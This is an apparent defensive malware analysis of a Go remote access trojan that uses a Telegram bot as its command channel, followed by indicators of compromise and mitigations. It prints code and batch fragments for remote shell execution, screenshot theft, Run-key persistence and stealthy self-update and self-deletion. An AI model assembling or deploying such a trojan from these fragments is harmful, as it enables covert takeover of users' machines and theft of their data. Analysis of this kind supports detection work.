# Windows RAT Malware Analysis

## ⚠️ WARNING: This is Malicious Software

This Go program is a **Remote Access Trojan (RAT)** designed to provide unauthorized remote control of Windows systems via Telegram bot.

---

## Overview

| Property | Details |
|----------|---------|
| **Type** | Remote Access Trojan (RAT) |
| **Language** | Go (Golang) |
| **C2 Channel** | Telegram Bot API |
| **Target OS** | Windows (hardcoded) |
| **Stealth** | Yes - hides processes & windows |
| **Persistence** | Yes - Windows Registry autostart |

---

## Core Malicious Functions

### 1. **Command Execution** (`bridge()`)
```go
cmd := exec.Command("cmd", "/c", input)
```
- Executes arbitrary Windows shell commands
- Returns output to Telegram bot (max 3500 chars)
- No validation or sandboxing

### 2. **Screenshot Capture** (`takeScreenshot()`)
```go
screenshot.CaptureRect(bounds)
```
- Captures full display contents
- Encodes as PNG and sends via Telegram
- Reveals passwords, credentials, sensitive data

### 3. **Process Enumeration** (`handleCallback() -> "process"`)
```go
exec.Command("tasklist", "/fi", "status eq running")
```
- Lists all running processes
- Sends output to attacker

### 4. **System Information** (`handleCallback() -> "sys"`)
- Hostname
- Uptime (via `GetTickCount()` Windows API)
- OS version

### 5. **Telegram Bot Control**
```go
bot.Handle(tele.OnCallback, handleCallback)
bot.Handle(tele.OnText, func(c tele.Context) error {
    if !shMode { return c.Send("Terminal off") }
    return c.Send(bridge(c.Text()))
})
```
- Responds ONLY to hardcoded admin ID
- Interactive shell mode toggle
- Inline keyboard buttons for quick commands

---

## Stealth & Evasion Mechanisms

### 1. **Process Hiding** (`setStealth()`)
```go
HideWindow = true           // No visible window
CreationFlags: 0x08000000   // CREATE_NO_WINDOW flag
```
- Runs completely invisible to user
- Evades basic process monitoring

### 2. **Low-Level Windows API**
```go
kernel32 := syscall.NewLazyDLL("kernel32.dll")
procGetTickCount := kernel32.NewProc("GetTickCount")
```
- Direct syscall for stealth
- Reflection to bypass type safety checks

### 3. **Persistence via Registry** (`autoStart()`)
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
  Value: "WinIndex"
  Path: C:\Users\[User]\AppData\Local\win_index.exe
```
- Copies itself to cache directory with innocuous name
- Registers in Windows Run registry key
- Auto-executes on every system startup
- Non-admin (HKCU, not HKLM)

---

## Self-Update Mechanism (`updateBot()`)

1. Receives new `.exe` via Telegram document upload
2. Downloads to `[current_path].new`
3. Creates batch script to:
   - Wait 2 seconds
   - Delete old executable
   - Move new executable to old location
   - Restart the malware
   - Delete the batch file

```batch
@echo off
timeout /t 2 /nobreak > nul
del /f /q "C:\old_path.exe"
move /y "C:\old_path.exe.new" "C:\old_path.exe"
start "" "C:\old_path.exe"
del %0
```

**Result:** Seamless version updates without user awareness

---

## Self-Deletion (`purgeSelf()`)

When `/purge` command is sent:
1. Removes registry entry
2. Creates batch script that:
   - Waits 2 seconds
   - Deletes registry key
   - Deletes executable
   - Deletes batch file itself
3. Exits and executes batch

**Result:** Complete removal with minimal traces

---

## Telegram Bot Interface

### Inline Keyboard:
```
[💻 Terminal] [📸 Screenshot]
[📊 Status]   [📋 Processes]
[🗑 Full Delete]
```

### Command Flow:
1. `/start` - Reports hostname, displays menu
2. Button clicks trigger callbacks
3. Text input (if terminal enabled) → executes as shell command
4. Document upload → update mechanism

### Access Control:
```go
if c.Sender().ID != adminID {
    return nil  // Silently ignores non-admin
}
```
- Only responds to hardcoded Telegram user ID
- No error messages to non-admins (stealth)

---

## Security Implications

### Information Disclosure:
- ✅ Screenshots (credentials, personal data)
- ✅ Running processes (software inventory)
- ✅ System info (hostname, OS, uptime)

### System Compromise:
- ✅ Arbitrary command execution (full system access)
- ✅ Can install ransomware, worms, spyware
- ✅ Can enable lateral movement in networks

### Data Exfiltration:
- ✅ File reading/deletion via shell commands
- ✅ Network access via cmd.exe tools

### Denial of Service:
- ✅ Process termination
- ✅ System shutdown
- ✅ Resource exhaustion (crypto-mining)

---

## Detection Indicators

### File Indicators:
- Executable in `%LOCALAPPDATA%\win_index.exe`
- Batch files in temp directory with Unix timestamps
- `.new` temporary files during updates

### Registry Indicators:
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
  Value: "WinIndex"
  Data: C:\Users\[User]\AppData\Local\win_index.exe
```

### Network Indicators:
- HTTPS connections to Telegram API (`api.telegram.org`)
- Requests to bot endpoints with bot token
- POST requests with JSON payloads

### Behavioral Indicators:
- Invisible `cmd.exe` child processes
- Registry write to Run key during execution
- File copy to cache directory at startup
- Screenshot file creation in temp

---

## Technical Details

| Component | Details |
|-----------|---------|
| **Language** | Go 1.x |
| **Dependencies** | `telebot.v3`, `image/png`, `screenshot` |
| **Compilation** | Standalone `.exe` (no runtime needed) |
| **File Size** | ~5-10 MB (typical Go binary) |
| **Admin Privilege** | Not required (uses HKCU) |
| **Obfuscation** | Minimal |

---

## Attacker Configuration

```go
var (
    T string // Bot Token (from @BotFather)
    A string // Admin ID (Telegram user ID)
)
```

Attacker must:
1. Create Telegram bot via @BotFather
2. Get bot token and their user ID
3. Compile with these values hardcoded
4. Distribute infected binary

---

## Defense & Mitigation

### User Level:
- Keep Windows Defender updated
- Don't run unknown `.exe` files
- Check `HKCU\...\Run` for unknown entries
- Monitor Telegram API traffic

### System Level:
- Application whitelisting (ASR rules)
- Disable `cmd.exe` execution (Group Policy)
- Monitor registry writes to Run keys
- Restrict outbound HTTPS

### Detection:
```powershell
# Find registry persistence
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Find suspicious cache files
Get-ChildItem "$env:LOCALAPPDATA\*.exe"

# Monitor batch files
Get-ChildItem "$env:TEMP\*.bat"
```

---

## Summary

**Threat Level:** 🔴 **CRITICAL**

This RAT provides:
- ✅ Interactive remote shell access
- ✅ Screenshot/visual data capture
- ✅ System persistence (autostart)
- ✅ Self-update capability
- ✅ Self-deletion without traces
- ✅ Complete invisibility to user
- ✅ Uses legitimate Telegram infrastructure as C2

**Never install, run, or distribute this malware.**